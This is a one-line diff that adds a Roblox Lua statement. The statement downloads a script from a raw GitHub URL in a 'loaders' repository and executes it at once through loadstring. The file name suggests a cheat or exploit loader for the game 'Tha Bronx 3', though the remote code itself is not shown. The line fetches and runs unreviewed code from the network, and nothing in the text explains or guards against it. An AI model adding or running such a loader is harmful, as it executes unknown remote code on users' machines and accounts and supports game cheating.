@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/tha-bronx-3-spam5-awe72siugzvm3q.lua"))()
